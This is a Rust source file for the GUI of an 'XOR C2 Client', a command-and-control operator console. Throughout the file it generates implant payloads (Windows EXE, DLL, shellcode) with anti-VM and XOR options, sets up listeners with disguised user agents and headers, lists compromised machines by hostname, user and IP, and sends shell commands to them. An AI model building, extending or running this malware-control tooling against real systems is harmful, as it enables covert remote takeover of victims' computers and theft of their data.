use crate::api::ApiClient;
use crate::models::*;
use crate::state::C2Client;
use chrono::Local;
use eframe::egui;
use std::fs::File;
use std::io::Write;

impl eframe::App for C2Client {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        if self.is_authenticated && self.auto_refresh {
            if self.last_refresh.elapsed().as_secs() >= 3 {
                self.refresh_data();
            }
        }

        if !self.is_authenticated {
            self.render_login_screen(ctx);
        } else {
            self.render_main_interface(ctx);
        }

        if self.generate_dialog.is_open {
            self.render_generate_agent_dialog(ctx);
        }
        if self.generate_listener_dialog.is_open {
            self.render_generate_listener(ctx);
        }
        ctx.request_repaint_after(std::time::Duration::from_millis(100));
    }
}

impl C2Client {
    pub fn open_agent_generator(&mut self, payload_type: &str) {
        self.generate_dialog.is_open = true;
        self.generate_dialog.payload_type = payload_type.to_string();
        self.generate_dialog.status_message.clear();
        self.generate_dialog.is_generating = false;

        match payload_type {
            "exe" | "dll" => {
                self.generate_dialog.host = "localhost".to_string();
                self.generate_dialog.port = 8088;
                self.generate_dialog.user_agent = "Mozilla/5.0".to_string();
                self.generate_dialog.uri_path = "/api/update".to_string();
            }
            _ => {
                self.generate_dialog.host = "localhost".to_string();
                self.generate_dialog.port = 8088;
                self.generate_dialog.user_agent = "Custom Agent".to_string();
                self.generate_dialog.uri_path = "/api/update".to_string();
            }
        }
    }

    pub fn render_generate_listener(&mut self, ctx: &egui::Context) {
        egui::Window::new("Generate Listener")
            .collapsible(false)
            .resizable(false)
            .default_width(600.0)
            .show(ctx, |ui| {
                ui.heading("Configure Listener Generation");
                ui.separator();
                ui.add_space(10.0);

                ui.horizontal(|ui| {
                    ui.label("Listener Name:");
                    ui.text_edit_singleline(&mut self.generate_listener_dialog.listener_name);
                });
                ui.add_space(5.0);

                ui.horizontal(|ui| {
                    ui.label("Listener Host:");
                    ui.text_edit_singleline(&mut self.generate_listener_dialog.listener_ip);
                });

                ui.add_space(5.0);

                ui.horizontal(|ui| {
                    ui.label("Listener Port:");
                    ui.add(
                        egui::DragValue::new(&mut self.generate_listener_dialog.listener_port)
                            .clamp_range(1..=65535),
                    );
                });

                ui.add_space(5.0);

                ui.horizontal(|ui| {
                    ui.label("Listener Type:");
                    ui.text_edit_singleline(&mut self.generate_listener_dialog.listener_type);
                });

                ui.add_space(5.0);

                ui.horizontal(|ui| {
                    ui.label("Listener Url Path:");
                    ui.text_edit_singleline(&mut self.generate_listener_dialog.uri_paths);
                });

                ui.add_space(5.0);

                ui.horizontal(|ui| {
                    ui.label("UserAgent");
                    ui.text_edit_singleline(&mut self.generate_listener_dialog.user_agent);
                });

                ui.add_space(5.0);

                ui.horizontal(|ui| {
                    ui.label("Xor Key:");
                    ui.text_edit_singleline(&mut self.generate_listener_dialog.xor_key);
                });

                ui.add_space(5.0);

                ui.separator();
                ui.collapsing("Custom Headers", |ui| {
                    let mut to_remove = None;
                    for (i, (key, value)) in
                        self.generate_listener_dialog.headers.iter_mut().enumerate()
                    {
                        ui.horizontal(|ui| {
                            ui.text_edit_singleline(key);
                            ui.text_edit_singleline(value);
                            if ui.button("❌").clicked() {
                                to_remove = Some(i);
                            }
                        });
                    }

                    if let Some(index) = to_remove {
                        self.generate_listener_dialog.headers.remove(index);
                    }

                    if ui.button("➕ Add Header").clicked() {
                        self.generate_listener_dialog
                            .headers
                            .push(("Header-Name".to_string(), "Header-Value".to_string()));
                    }
                });

                ui.add_space(10.0);

                if !self.generate_listener_dialog.status_message.is_empty() {
                    let color = if self.generate_listener_dialog.status_message.contains("✅") {
                        egui::Color32::GREEN
                    } else if self.generate_listener_dialog.status_message.contains("❌") {
                        egui::Color32::RED
                    } else {
                        egui::Color32::YELLOW
                    };
                    ui.colored_label(color, &self.generate_listener_dialog.status_message);
                    ui.add_space(5.0);
                }

                ui.separator();

                ui.horizontal(|ui| {
                    if ui.button("❌ Cancel").clicked() {
                        self.generate_listener_dialog.is_open = false;
                        self.generate_listener_dialog.status_message.clear();
                    }

                    ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
                        if ui.button("✅ Generate").clicked() {
                            self.handle_generate_listener();
                        }
                    });
                });
            });
    }

    pub fn handle_generate_listener(&mut self) {
        if let Some(token) = &self.token {
            self.generate_listener_dialog.status_message = "Generating listener...".to_string();

            let server_url = self.server_url.clone();
            let token = token.clone();
            let config = self.generate_listener_dialog.clone();

            match self
                .rt
                .block_on(ApiClient::add_listener(&server_url, &token, &config))
            {
                Ok(message) => {
                    self.generate_listener_dialog.status_message = format!("✅ {}", message);

                    std::thread::sleep(std::time::Duration::from_millis(500));

                    self.refresh_data();
                }
                Err(error) => {
                    self.generate_listener_dialog.status_message = format!("❌ Error: {}", error);
                }
            }
        }
    }

    pub fn render_generate_agent_dialog(&mut self, ctx: &egui::Context) {
        egui::Window::new("🎯 Generate Agent")
            .collapsible(false)
            .resizable(false)
            .default_width(600.0)
            .show(ctx, |ui| {
                ui.heading("Configure Agent Generation");
                ui.separator();
                ui.add_space(10.0);

                ui.horizontal(|ui| {
                    ui.label("Listener Name:");
                    ui.text_edit_singleline(&mut self.generate_dialog.listener_name);
                });
                ui.add_space(5.0);

                ui.horizontal(|ui| {
                    ui.label("Payload Type:");
                    egui::ComboBox::from_label("")
                        .selected_text(&self.generate_dialog.payload_type)
                        .show_ui(ui, |ui| {
                            ui.selectable_value(
                                &mut self.generate_dialog.payload_type,
                                "exe".to_string(),
                                "Windows EXE",
                            );
                            ui.selectable_value(
                                &mut self.generate_dialog.payload_type,
                                "dll".to_string(),
                                "Windows DLL",
                            );
                            ui.selectable_value(
                                &mut self.generate_dialog.payload_type,
                                "shellcode".to_string(),
                                "Shellcode",
                            );
                        });
                });

                ui.add_space(10.0);

                ui.heading("Advanced Configuration");
                ui.separator();

                ui.horizontal(|ui| {
                    ui.label("Beacon Interval (s):");
                    ui.add(
                        egui::DragValue::new(&mut self.generate_dialog.beacon_interval)
                            .clamp_range(1..=3600)
                            .speed(1),
                    );
                });

                ui.horizontal(|ui| {
                    ui.checkbox(&mut self.generate_dialog.anti_vm, "Anti-VM");
                });

                ui.add_space(10.0);

                if !self.generate_dialog.status_message.is_empty() {
                    let color = if self.generate_dialog.status_message.contains("Success")
                        || self.generate_dialog.status_message.contains("saved")
                    {
                        egui::Color32::GREEN
                    } else {
                        egui::Color32::RED
                    };
                    ui.colored_label(color, &self.generate_dialog.status_message);
                    ui.add_space(5.0);
                }

                ui.separator();

                ui.horizontal(|ui| {
                    if ui.button("❌ Cancel").clicked() {
                        self.generate_dialog.is_open = false;
                    }

                    ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
                        let generate_btn = ui.add_enabled(
                            !self.generate_dialog.is_generating,
                            egui::Button::new(if self.generate_dialog.is_generating {
                                "⏳ Generating..."
                            } else {
                                "✅ Generate"
                            }),
                        );

                        if generate_btn.clicked() {
                            self.handle_generate_agent();
                        }
                    });
                });
            });
    }

    pub fn handle_generate_agent(&mut self) {
        if let Some(token) = &self.token {
            self.generate_dialog.is_generating = true;
            self.generate_dialog.status_message = "Generating agent...".to_string();

            let server_url = self.server_url.clone();
            let token = token.clone();
            let config = self.generate_dialog.clone();

            match self.rt.block_on(ApiClient::generate_agent_with_config(
                &server_url,
                &token,
                &config,
            )) {
                Ok(agent_data) => {
                    let filename = format!(
                        "agent_{}_{}.{}",
                        config.payload_type,
                        chrono::Local::now().format("%Y%m%d_%H%M%S"),
                        crate::state::get_file_extension(&config.payload_type)
                    );

                    match File::create(&filename) {
                        Ok(mut file) => {
                            if let Err(e) = file.write_all(&agent_data) {
                                self.generate_dialog.status_message =
                                    format!("Error saving file: {}", e);
                            } else {
                                self.generate_dialog.status_message =
                                    format!("✅ Success! Agent saved to: {}", filename);

                                std::thread::sleep(std::time::Duration::from_millis(500));
                                self.refresh_data();
                            }
                        }
                        Err(e) => {
                            self.generate_dialog.status_message =
                                format!("Error creating file: {}", e);
                        }
                    }
                }
                Err(e) => {
                    self.generate_dialog.status_message = format!("Error: {}", e);
                }
            }

            self.generate_dialog.is_generating = false;
        }
    }

    pub fn render_login_screen(&mut self, ctx: &egui::Context) {
        egui::CentralPanel::default().show(ctx, |ui| {
            let available_height = ui.available_height();

            ui.vertical_centered(|ui| {
                ui.add_space(available_height / 3.0);

                ui.heading("XOR C2 Client");
                ui.add_space(30.0);

                egui::Frame::none()
                    .fill(egui::Color32::from_rgb(30, 30, 30))
                    .stroke(egui::Stroke::new(1.0, egui::Color32::from_rgb(60, 60, 60)))
                    .inner_margin(20.0)
                    .show(ui, |ui| {
                        ui.set_width(400.0);

                        ui.label("Server URL:");
                        ui.text_edit_singleline(&mut self.server_url);
                        ui.add_space(10.0);

                        ui.label("Username:");
                        ui.text_edit_singleline(&mut self.username);
                        ui.add_space(10.0);

                        ui.label("Password:");
                        ui.add(egui::TextEdit::singleline(&mut self.password).password(true));
                        ui.add_space(20.0);

                        if !self.login_error.is_empty() {
                            ui.colored_label(egui::Color32::RED, &self.login_error);
                            ui.add_space(10.0);
                        }

                        let login_button = ui.add_sized([380.0, 40.0], egui::Button::new("Login"));

                        if login_button.clicked() || ui.input(|i| i.key_pressed(egui::Key::Enter)) {
                            self.handle_login();
                        }
                    });
            });
        });
    }

    pub fn render_main_interface(&mut self, ctx: &egui::Context) {
        egui::TopBottomPanel::top("header").show(ctx, |ui| {
            ui.horizontal(|ui| {
                ui.heading("XOR C2 Client");
                ui.separator();

                ui.checkbox(&mut self.auto_refresh, "🔄 Auto-refresh");

                if ui.button("🔃 Refresh Now").clicked() {
                    self.refresh_data();
                }

                ui.separator();

                ui.menu_button("➕ Generate Agent", |ui| {
                    if ui.button("🪟 Windows EXE").clicked() {
                        self.open_agent_generator("exe");
                        ui.close_menu();
                    }
                    if ui.button("🪟 Windows DLL").clicked() {
                        self.open_agent_generator("dll");
                        ui.close_menu();
                    }
                    if ui.button("💉 Shellcode").clicked() {
                        self.open_agent_generator("shellcode");
                        ui.close_menu();
                    }
                });
                if ui.button("🎧 Generate Listener").clicked() {
                    self.generate_listener_dialog.is_open = true;
                    ui.close_menu();
                }
                ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
                    if ui.button("🚪 Logout").clicked() {
                        self.handle_logout();
                    }
                    ui.label(format!("👤 {}", self.username));
                });
            });
        });

        egui::SidePanel::left("agents_panel")
            .default_width(350.0)
            .show(ctx, |ui| {
                self.render_agents_panel(ui);
            });

        egui::CentralPanel::default().show(ctx, |ui| {
            self.render_terminal(ui);
        });
    }

    pub fn render_agents_panel(&mut self, ui: &mut egui::Ui) {
        ui.heading(format!("👥 Active Agents ({})", self.agents.len()));
        ui.separator();

        egui::ScrollArea::vertical().show(ui, |ui| {
            if self.agents.is_empty() {
                ui.centered_and_justified(|ui| {
                    ui.label("No active agents");
                });
            } else {
                for agent in self.agents.clone() {
                    let is_selected = self
                        .selected_agent
                        .as_ref()
                        .map(|a| a.id == agent.id)
                        .unwrap_or(false);

                    let status = if agent.hostname.is_some() {
                        "🟢"
                    } else {
                        "🟡"
                    };

                    let button_text = format!(
                        "{} {}\n📝 {}\n👤 {}\n🖥️  {}\n🌐 {}\n📦 {} | 🎯 {}",
                        status,
                        &agent.id[..8],
                        agent
                            .hostname
                            .as_deref()
                            .unwrap_or("Waiting for check-in..."),
                        agent.username.as_deref().unwrap_or("Unknown"),
                        agent.process_name.as_deref().unwrap_or("Unknown"),
                        agent.ip.as_deref().unwrap_or("Unknown"),
                        agent.payload_type,
                        agent.listener_name
                    );

                    let mut button = egui::Button::new(button_text)
                        .min_size(egui::vec2(ui.available_width(), 120.0));

                    if is_selected {
                        button = button.fill(egui::Color32::from_rgb(40, 80, 40));
                    }

                    if ui.add(button).clicked() {
                        self.select_agent(agent);
                    }

                    ui.add_space(5.0);
                }
            }
        });
    }

    pub fn render_terminal(&mut self, ui: &mut egui::Ui) {
        // ===== Header =====
        ui.heading(if let Some(agent) = &self.selected_agent {
            format!(
                "📟 Terminal - {} [{}]",
                agent.hostname.as_deref().unwrap_or("Unknown"),
                &agent.id[..8]
            )
        } else {
            "📟 Terminal - Select an agent".to_string()
        });
        ui.separator();

        // ===== Agent info =====
        if let Some(agent) = &self.selected_agent {
            ui.horizontal(|ui| {
                ui.label(format!(
                    "👤 User: {}",
                    agent.username.as_deref().unwrap_or("Unknown")
                ));
                ui.separator();
                ui.label(format!(
                    "🖥️  Process: {}",
                    agent.process_name.as_deref().unwrap_or("Unknown")
                ));
                ui.separator();
                ui.label(format!(
                    "🌐 IP: {}",
                    agent.ip.as_deref().unwrap_or("Unknown")
                ));
            });
            ui.separator();
        }

        // ===== Terminal frame =====
        let frame = egui::Frame::none()
            .fill(egui::Color32::BLACK)
            .stroke(egui::Stroke::new(1.0, egui::Color32::from_rgb(0, 200, 0)))
            .inner_margin(10.0);

        frame.show(ui, |ui| {
            egui::ScrollArea::vertical()
                .auto_shrink([false, false])
                .stick_to_bottom(true)
                .max_height(ui.available_height() - 80.0)
                .show(ui, |ui| {
                    ui.style_mut().override_text_style = Some(egui::TextStyle::Monospace);

                    if self.results.is_empty() {
                        ui.colored_label(egui::Color32::GREEN, "$ Ready to execute commands...");
                        return;
                    }

                    for result in &self.results {
                        // ===== Command input =====
                        if result.is_command {
                            ui.colored_label(egui::Color32::GREEN, format!("$ {}", result.content));
                        }
                        // ===== File ready for download =====
                        // else if result.is_file {
                        //     ui.horizontal(|ui| {
                        //         ui.colored_label(egui::Color32::from_rgb(180, 180, 255), &result.content);

                        //         // Bouton Download
                        //         if let Some(id) = result.result_id {
                        //             if ui.button("📥 Download").clicked() {
                        //                 // Utilisation de la fonction centralisée
                        //                 self.download_result_file(id);
                        //             }
                        //         }
                        //     });
                        // }

                        // ===== Normal output =====
                        else {
                            ui.colored_label(egui::Color32::LIGHT_GRAY, &result.content);
                        }

                        // ===== Timestamp =====
                        ui.colored_label(
                            egui::Color32::DARK_GRAY,
                            format!("  [{}]", result.timestamp),
                        );
                        ui.add_space(5.0);
                    }
                });
        });

        ui.add_space(10.0);

        // ===== Input line =====
        ui.horizontal(|ui| {
            ui.label("$");

            let response = ui.add_enabled(
                self.selected_agent.is_some(),
                egui::TextEdit::singleline(&mut self.command_input).hint_text("Enter command..."),
            );

            if response.lost_focus() && ui.input(|i| i.key_pressed(egui::Key::Enter)) {
                self.handle_send_command();
                response.request_focus();
            }

            if ui
                .add_enabled(
                    self.selected_agent.is_some(),
                    egui::Button::new("▶ Execute"),
                )
                .clicked()
            {
                self.handle_send_command();
            }
        });

        // ===== Error =====
        if !self.command_error.is_empty() {
            ui.colored_label(egui::Color32::RED, &self.command_error);
        }
    }

    pub fn handle_login(&mut self) {
        self.loading = true;
        self.login_error.clear();

        let server_url = self.server_url.clone();
        let username = self.username.clone();
        let password = self.password.clone();
        let rt = self.rt.clone();

        match rt.block_on(ApiClient::login(&server_url, &username, &password)) {
            Ok(token) => {
                self.token = Some(token);
                self.is_authenticated = true;
                self.password.clear();
                self.refresh_data();
            }
            Err(e) => {
                self.login_error = e;
            }
        }

        self.loading = false;
    }

    pub fn handle_logout(&mut self) {
        if let Some(token) = &self.token {
            let _ = self.rt.block_on(ApiClient::logout(&self.server_url, token));
        }

        self.is_authenticated = false;
        self.token = None;
        self.agents.clear();
        self.selected_agent = None;
        self.results.clear();
    }

    pub fn select_agent(&mut self, agent: crate::models::Agent) {
        self.selected_agent = Some(agent.clone());
        self.results.clear();
        self.fetch_agent_results();
    }

    pub fn handle_send_command(&mut self) {
        if self.command_input.is_empty() || self.selected_agent.is_none() {
            return;
        }

        self.command_error.clear();

        let command = self.command_input.clone();
        let agent_id = self.selected_agent.as_ref().unwrap().id.clone();
        let token = self.token.clone().unwrap();
        let server_url = self.server_url.clone();

        // ===== Limite historique =====
        const MAX_HISTORY: usize = 5;

        if self.results.len() >= MAX_HISTORY * 2 {
            let keep_from = self.results.len().saturating_sub(MAX_HISTORY * 2);
            self.results = self.results.split_off(keep_from);
        }

        self.results.push(crate::models::CommandResult {
            timestamp: Local::now().format("%H:%M:%S").to_string(),
            is_command: true,
            content: command.clone(),
            result_id: None,
            is_file: false,
        });

        match self.rt.block_on(ApiClient::send_command(
            &server_url,
            &token,
            &agent_id,
            &command,
        )) {
            Ok(_) => {
                self.command_input.clear();
                std::thread::sleep(std::time::Duration::from_millis(500));
                self.fetch_agent_results();
            }
            Err(e) => {
                self.command_error = e;
            }
        }
    }

    pub fn refresh_data(&mut self) {
        if let Some(token) = &self.token {
            let token = token.clone();
            let server_url = self.server_url.clone();

            match self
                .rt
                .block_on(ApiClient::fetch_agents(&server_url, &token))
            {
                Ok(agents) => {
                    self.agents = agents;
                }
                Err(e) => {
                    eprintln!("Error fetching agents: {}", e);
                }
            }

            if self.selected_agent.is_some() {
                self.fetch_agent_results();
            }
        }

        self.last_refresh = std::time::Instant::now();
    }

    pub fn fetch_agent_results(&mut self) {
        if let (Some(token), Some(agent)) = (&self.token, &self.selected_agent) {
            let token = token.clone();
            let agent_id = agent.id.clone();
            let server_url = self.server_url.clone();
            let save_dir = "download";
            match self.rt.block_on(ApiClient::fetch_results(
                &server_url,
                &token,
                &agent_id,
                &save_dir,
            )) {
                Ok(new_results) => {
                    let local_commands: Vec<_> = self
                        .results
                        .iter()
                        .filter(|r| r.is_command)
                        .cloned()
                        .collect();

                    self.results = local_commands;
                    self.results.extend(new_results);

                    println!(
                        "[+] Results updated: {} command(s) + {} result(s)",
                        self.results.iter().filter(|r| r.is_command).count(),
                        self.results.iter().filter(|r| !r.is_command).count()
                    );
                }
                Err(e) => {
                    eprintln!("Error fetching results: {}", e);
                }
            }
        }
    }
}
